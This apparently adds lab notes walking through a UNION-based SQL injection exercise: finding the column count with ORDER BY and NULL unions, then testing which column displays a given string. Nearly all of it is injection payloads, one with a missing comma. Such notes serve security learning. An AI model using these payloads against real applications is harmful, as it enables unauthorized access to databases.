@@ -1,0 +1,18 @@
+#Step 1:  First of all find the number of columns using any of these methods:-
+
+1. ' order by 1--
+2. ' union select null,null,null --
+
+#Step 2:   We have to print the random string given 'lXZy5s'.
+
+Union rules says:-
+
+a. Every SELECT should have same number of columns.
+b. Columns must have similar data types.
+c. Columns in every SELECT should be in same order.
+
+# So, we have to try every possible order to print the random string.
+
+1. ' union select 'lXZy5s',null,null--
+2. ' union select null,'lXZy5s',null--	[BOOM!!! This order is working.]
+3. ' union select null,null'lXZy5s'--
